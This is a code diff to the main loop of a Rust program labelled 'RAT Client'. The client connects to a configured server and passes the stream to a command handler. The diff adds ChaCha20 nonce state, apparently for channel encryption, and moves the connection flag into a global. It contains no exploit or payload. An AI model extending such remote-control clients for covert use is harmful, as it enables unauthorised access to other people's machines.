@@ -6,6 +6,7 @@ use std::net::TcpStream;
 use std::sync::{ Arc, Mutex };
 use std::thread::sleep;
 use once_cell::sync::Lazy;
+use rand_chacha::ChaCha20Rng;
 
 use crate::features::tray_icon::TrayIcon;
 use crate::handler::handle_server;
@@ -25,10 +26,13 @@ static SECRET: Lazy<Mutex<[u8; common::SECRET_LEN]>> = Lazy::new(||
     Mutex::new([0u8; common::SECRET_LEN])
 );
 
+static NONCE_WRITE: Lazy<Mutex<Option<ChaCha20Rng>>> = Lazy::new(|| Mutex::new(None));
+static NONCE_READ: Lazy<Mutex<Option<ChaCha20Rng>>> = Lazy::new(|| Mutex::new(None));
+
+static IS_CONNECTED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
+
 fn main() {
     let config = service::config::get_config();
-
-    let is_connected = Arc::new(Mutex::new(false));
 
     {
         let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
@@ -40,27 +44,33 @@ fn main() {
 
     loop {
         let config_clone = config.clone();
-        let is_connected_clone = is_connected.clone();
         let tray_icon_clone = tray_icon.clone();
 
-        if *is_connected_clone.lock().unwrap() {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
-            sleep(std::time::Duration::from_secs(5));
-            continue;
-        } else {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+        {
+            let is_connected_guard = crate::IS_CONNECTED.lock().unwrap();
+
+            if *is_connected_guard {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
+                sleep(std::time::Duration::from_secs(5));
+                continue;
+            } else {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+            }
         }
 
         std::thread::spawn(move || {
+            {
+                let mut is_connected_guard = IS_CONNECTED.lock().unwrap();
+                *is_connected_guard = true;
+            }
             println!("Connecting to server...");
             let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
             if let Ok(str) = stream {
-                *is_connected_clone.lock().unwrap() = true;
-                handle_server(
-                    str.try_clone().unwrap(),
-                    str.try_clone().unwrap(),
-                    is_connected_clone
-                );
+                {
+                    let mut is_connected_guard = IS_CONNECTED.lock().unwrap();
+                    *is_connected_guard = true;
+                }
+                handle_server(str.try_clone().unwrap(), str.try_clone().unwrap());
             }
         });
         sleep(std::time::Duration::from_secs(5));
